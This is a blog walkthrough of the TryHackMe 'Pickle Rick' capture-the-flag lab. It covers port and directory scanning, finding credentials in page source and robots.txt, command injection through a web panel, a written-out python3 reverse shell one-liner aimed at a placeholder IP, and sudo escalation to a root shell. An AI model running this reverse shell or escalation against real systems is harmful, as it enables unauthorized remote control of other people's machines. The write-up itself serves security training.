---
layout: post
author: n0nu11
title: "[TryHackMe] Pickle Rick Walkthrough"
date: 2020-05-15T15:10:18.331Z
published: true
tags:
  - tryhackme
  - solutions
  - CTF
  - command injection
  - privilege escalation
  - directory scanning
image: /assets/images/picklerick/picklerick2.jpg
description: Pickle Rick is a Rick and Morty themed CTF challenge. It requires you to exploit the webserver and find <b>3</b> ingredients that will help Rick make his potion to transform himself back to human from a pickle. This is an easy challenge that can teach you directory scanning, command injection, Sudo privilege escalation, etc.
category:
  - tryhackme
---


# Introduction

Pickle Rick is a Rick and Morty themed CTF challenge. It requires you to exploit the webserver and find **3** ingredients that will help Rick make his potion to transform himself back to human from a pickle.

This is an easy challenge that can teach you directory scanning, command injection, Sudo privilege escalation, etc.

![picklerick](https://media.giphy.com/media/9zXWAIcr6jycE/giphy.gif)

---

# Nmap

let's start with the Nmap scan.

```
Nmap -p- -A -T4 10.10.159.88 -oN nmap/fullscan
```

![nmap](/assets/images/picklerick/picklericknmap.png)

This may take a while. Why not grab a juice?

![juice](https://media.giphy.com/media/skwCXPNUY1MUU/giphy.gif)

![nmap2](/assets/images/picklerick/picklericknmap2.png)

**SSH** and **Webserver** is open. SSH can wait, let's check the webserver.

![](/assets/images/picklerick/picklerick2.png)

Nothing interesting here, let's check the source code?

![](/assets/images/picklerick/picklericksource.png)

There's a comment by Rick. His Username is **R1ckRul3s.** Hmm a username? there's no login page for username. Maybe SSH login?. let's try it.

```
ssh R1ckRul3s@10.10.159.88
```

![](/assets/images/picklerick/picklericksshfail.png)

SSH is kicking us out. We cant use SSH now.

---

# Directory Scanning

Lets fire up the **Dirbuster** and scan the directories. I tried looking for **PHP** and **txt** files.

![](/assets/images/picklerick/picklerickds.png)

![](https://media.giphy.com/media/RmfzOLuCJTApa/giphy.gif)

We got

* robots.txt
* login.php
* portal.php

> Assets and Icons directory had a bunch of GIF and JPEG images with other static files. I tried Steganography against JPEG images but no luck.

Let's check **robots.txt** file.

![](/assets/images/picklerick/picklerickrobots.png)

`Wubbalubbadubdub` ? Interesting, maybe a password? Let's save it, it may come handy later.

![](https://media.giphy.com/media/l41lI4bYmcsPJX9Go/giphy.gif)

Now lets check **login.php**

A login page finally!, let's try the username `R1ckRul3s` and `Wubbalubbadubdub`.

![](/assets/images/picklerick/picklericklogin.png)

And it worked! We're in **portal.php**

![](/assets/images/picklerick/picklerickportal.png)

![](https://media.giphy.com/media/i2dE5VvBNxBw4/giphy.gif)

---

# Command Injection

Remember **portal.php** ?. Its says command panel. Can it run Linux commands?. Let's check it out.

![](/assets/images/picklerick/picklerickciid.png)

Yes, It does. Let's check the files.

![](/assets/images/picklerick/picklerickcils.png)

`Sup3rS3cretPickl3Ingred.txt`? It looks like we found our first ingredient!.

let's see what's inside the `Sup3rS3cretPickl3Ingred.txt` using `cat` command.

```bash
cat Sup3rS3cretPickl3Ingred.txt
```

![](/assets/images/picklerick/picklerickcatfail.png)

Uh oh!. We can't use \`cat\` command. Let's try \`less\` command then.

![](/assets/images/picklerick/picklerickciless.png)

Ah! Finally an ingredient found. 2 more to go. Hold on Rick!.

![](https://media.giphy.com/media/Rgo50jdPhiJRiGQH9C/giphy.gif)

---

# Reverse Shell

Since we have command injection ability, let's get a reverse shell. Head to \[Pentestmonkey reverse shell cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

> Python 2 wasn't available but python 3 was. So I tired reverse shell with python 3

Start a netcat listener in the terminal.

![](/assets/images/picklerick/picklerickrs.png)

and run 

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR IP>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

> Replace your IP address with <YOUR IP>

And we got the reverse shell!

![](/assets/images/picklerick/picklerickshell1.png)

Now let's find other ingredients.

`ls /home` revealed **rick** folder.

![](/assets/images/picklerick/picklerickshell2.png)

let's check the rick folder.

![](/assets/images/picklerick/picklerickshell3.png)

It seems like we got 2nd ingredient!.

![](/assets/images/picklerick/picklerickshell4.png)

The 2nd Ingredient is **1 jerry tear**.

\> I checked for 3rd ingredient but unfortunately i can't able to find it. It seems like it is hidden inside /root folder. We need the root access to get the 3rd ingredient.
## Privilege Escalation
Let's check if we have any root access.run 

`sudo -l`

![](/assets/images/picklerick/picklerickshell5.png)

`sudo -l` shows that we can run any command as root without password. Hurray!

![wow](https://media.giphy.com/media/5VKbvrjxpVJCM/giphy.gif)

Let's get the root shell now.

`sudo /bin/bash`

![](/assets/images/picklerick/pickleshell6.png)

Finally we have root access!

Let's find the 3rd ingredient to save Rick!.

![](/assets/images/picklerick/picklerickshell7.png)

As I thought there's the 3rd ingredient. Let's get it!.

![](/assets/images/picklerick/picklerickshell8.png)

We got all the 3 ingredients. Time to save Rick.

![](/assets/images/picklerick/picklerickfinal.png)

And we are Done!. Hurray!

![done](https://media.giphy.com/media/l41JU9pUyosHzWyuQ/giphy.gif)

---

# Summary

* Nmap scan showed 2 ports open, 22 (ssh), and 80 (webserver).
* SSH denied access for any credentials making it useless for this challenge.
* port 80 is up and running. checking its source revealed the username.
* The Directory Scanner against webserver revealed login.php,robots.txt,portal.php
* The robots.txt file revealed the password.
* The credentials obtained are used in login.php which redirected to portal.php on successful login.
* portal page had command injection vulnerability which then used to get the 1st ingredient.
* A reverse shell is obtained using command injection.
* The home directory contained a rick folder which then contained the 2nd ingredient.
* sudo -l command revealed that we can run any command as root without password.
* sudo /bin/bash to obtain a root shell.
* The /root folder contained the 3rd ingredient.

## Before you leave

If you have any constructive criticism or any questions, please drop an email at root@n0nu11.tech or ping me in [instagram](https://instagram.com/dvlp.er). I'll be happy to hear your feedback.

Follow me on  [ <i class="fa fa-github"></i> Github](https://github.com/devwaseem), [<i class="fa fa-twitter"></i> Twitter](https://twitter.com/iamwaseem99), [<i class="fa fa-instagram"></i> Instagram](https://www.instagram.com/dvlp.er/), [<i class="fa fa-facebook"></i> Facebook](https://www.facebook.com/dvlprwaseem), [<i class="fa fa-linkedin"></i> LinkedIn](https://www.linkedin.com/in/devwaseem/).

![bye](https://media.giphy.com/media/TfFDiw5gBuEns4ykJl/giphy.gif)